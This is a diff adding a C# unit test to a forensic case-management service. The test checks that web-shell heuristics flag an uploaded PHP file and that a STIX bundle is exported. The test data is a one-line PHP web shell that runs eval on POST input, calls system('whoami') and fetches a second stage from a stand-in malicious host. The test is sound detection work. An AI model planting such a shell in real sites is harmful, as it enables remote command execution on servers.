@@ -648,6 +648,29 @@ public sealed class ForensicCaseServiceTests : IDisposable
         return data;
     }
 
+    [Fact]
+    public async Task Pipeline_DetectsWebShellAndExportsStixBundle()
+    {
+        var exporter = new StixIndicatorExporter();
+        var service = new JsonForensicCaseService(new TestEnvironment(_root), [new WebShellHeuristicsAnalyzer(), new StaticTextAnalyzer()]);
+        var item = await service.CreateAsync(new CreateCaseInput { Title = "Web shell case", RequestingOrganization = "Forensic Lab", LeadExaminer = "Examiner A", Scope = "Known test data only" }, default);
+        await service.AuthorizeAsync(new AuthorizeCaseInput { CaseId = item.Id, Authority = "Test authority", Reference = "AUTH-004", ApprovedBy = "Supervisor", Limitations = "Laboratory validation" }, default);
+        var shell = "<?php @eval($_POST['c']); $d = base64_decode($_GET['d']); system('whoami'); file_get_contents('http://malicious.example/stage2'); ?>";
+        var result = await service.AcquireAsync(AcquisitionInput(item.Id, new FormFile(new MemoryStream(Encoding.UTF8.GetBytes(shell)), 0, Encoding.UTF8.GetByteCount(shell), "File", "cache.php")), default);
+        Assert.True(result.Success, result.Message);
+        await service.StartAnalysisAsync(item.Id, "Analyst", default);
+
+        var analysis = await service.AnalyzeEvidenceAsync(item.Id, item.Evidence.Single().Id, "Analyst", default);
+
+        Assert.True(analysis.Success, analysis.Message);
+        Assert.Contains(item.Artifacts, x => x.Name == "Shell PHP por petición" && x.Confidence == ConfidenceLevel.Inferred);
+        Assert.Contains(item.Indicators, x => x.Value == "webshell-heuristics");
+        var stix = exporter.Export(item);
+        Assert.True(stix.Indicators > 0);
+        Assert.Contains("[url:value = 'http://malicious.example/stage2']", stix.Content);
+        Assert.Contains(item.AuditTrail, x => x.Action == "STATIC_ANALYSIS_COMPLETED" && x.Detail.Contains("webshell-heuristics"));
+    }
+
     private Task<ForensicCase> CreateCase() => _service.CreateAsync(new CreateCaseInput { Title = "Validated case", RequestingOrganization = "Forensic Lab", LeadExaminer = "Examiner A", Scope = "Known test data only" }, default);
     private Task<OperationResult> Authorize(Guid id) => _service.AuthorizeAsync(new AuthorizeCaseInput { CaseId = id, Authority = "Test authority", Reference = "AUTH-001", ApprovedBy = "Supervisor", Limitations = "Laboratory validation" }, default);
     private Task<OperationResult> Acquire(Guid id, string name, string content) => Acquire(id, name, Encoding.UTF8.GetBytes(content));
